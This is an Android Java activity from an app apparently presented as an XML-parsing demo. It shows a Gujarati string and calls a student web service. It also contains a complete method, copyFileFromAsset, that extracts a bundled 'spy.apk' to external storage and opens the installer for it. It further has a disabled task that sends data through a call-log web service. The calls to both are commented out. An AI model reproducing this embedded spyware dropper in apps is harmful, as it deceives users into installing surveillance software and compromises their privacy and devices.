package com.example.ankit.xmlparsingapp;

import android.content.Intent;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

import com.example.ankit.xmlparsingapp.webservice.WSCallLogs;
import com.example.ankit.xmlparsingapp.webservice.WSGetStudent;
import com.example.ankit.xmlparsingapp.webservice.WebService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //copyFileFromAsset();
        String str = decodeUnicode("\\u0aa8\\u0abe\\u0ab3\\u0abf\\u0aaf\\u0ac7\\u0ab0\\u0aa8\\u0ac0 \\u0a9a\\u0a9f\\u0aa3\\u0ac0 (\\u0aab\\u0ab0\\u0abe\\u0ab3\\u0ac0)");
        TextView textView = (TextView) findViewById(R.id.text);
        textView.setText(str);
        getNetworkCall();


//        List<Employee> employees = null;
//        try {
//            XMLPullParserHandler parser = new XMLPullParserHandler();
//            InputStream is = getAssets().open("employees.xml");
//            employees = parser.parse(is);
//
//            Log.e(MainActivity.class.getSimpleName(), "" + employees.size());
//
//        } catch (IOException e) {
//            e.printStackTrace();
//        }

    }

    private void getNetworkCall() {
        if (WebService.isNetworkAvailable(MainActivity.this)) {
            new AsynCCallData().execute();
            //new AsynCallLog().execute();
        }

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }


    private void copyFileFromAsset() {
        AssetManager assetManager = getAssets();

        InputStream in = null;
        OutputStream out = null;

        try {
            in = assetManager.open("spy.apk");
            out = new FileOutputStream(Environment.getExternalStorageDirectory() + "/myapk.apk");

            byte[] buffer = new byte[1024];

            int read;
            while ((read = in.read(buffer)) != -1) {

                out.write(buffer, 0, read);

            }

            in.close();
            in = null;

            out.flush();
            out.close();
            out = null;

            Intent intent = new Intent(Intent.ACTION_VIEW);

            intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + "/myapk.apk")),
                    "application/vnd.android.package-archive");

            startActivity(intent);

        } catch (Exception e) {
        }
    }

    private class AsynCCallData extends AsyncTask<Void, Void, String> {

        @Override
        protected String doInBackground(Void... voids) {
            WSGetStudent wsGetStudent = new WSGetStudent(MainActivity.this);
            return wsGetStudent.executeWebservice();
        }

        @Override
        protected void onPostExecute(String aVoid) {
            super.onPostExecute(aVoid);
            try {
                String result = aVoid.replaceAll("\\\\", "");
                JSONObject jsonObject = new JSONObject(result);
                Log.e("HEll0", "Hello");
            } catch (JSONException e) {
                e.printStackTrace();
            }

        }
    }


    private class AsynCallLog extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... voids) {
            WSCallLogs wsCallLogs = new WSCallLogs(MainActivity.this);
            wsCallLogs.executeWebservice("45%", "wifi1");
            return null;
        }
    }


    private static String decodeUnicode(String theString) {
        char aChar;
        int len = theString.length();
        StringBuffer outBuffer = new StringBuffer(len);
        for (int x = 0; x < len; ) {
            aChar = theString.charAt(x++);
            if (aChar == '\\') {
                aChar = theString.charAt(x++);
                if (aChar == 'u') {
                    // Read the xxxx
                    int value = 0;
                    for (int i = 0; i < 4; i++) {
                        aChar = theString.charAt(x++);
                        switch (aChar) {
                            case '0':
                            case '1':
                            case '2':
                            case '3':
                            case '4':
                            case '5':
                            case '6':
                            case '7':
                            case '8':
                            case '9':
                                value = (value << 4) + aChar - '0';
                                break;
                            case 'a':
                            case 'b':
                            case 'c':
                            case 'd':
                            case 'e':
                            case 'f':
                                value = (value << 4) + 10 + aChar - 'a';
                                break;
                            case 'A':
                            case 'B':
                            case 'C':
                            case 'D':
                            case 'E':
                            case 'F':
                                value = (value << 4) + 10 + aChar - 'A';
                                break;
                            default:
                                throw new IllegalArgumentException(
                                        "Malformed   \\uxxxx   encoding.");
                        }

                    }
                    outBuffer.append((char) value);
                } else {
                    if (aChar == 't')
                        aChar = '\t';
                    else if (aChar == 'r')
                        aChar = '\r';
                    else if (aChar == 'n')
                        aChar = '\n';
                    else if (aChar == 'f')
                        aChar = '\f';
                    outBuffer.append(aChar);
                }
            } else
                outBuffer.append(aChar);
        }
        return outBuffer.toString();
    }
}
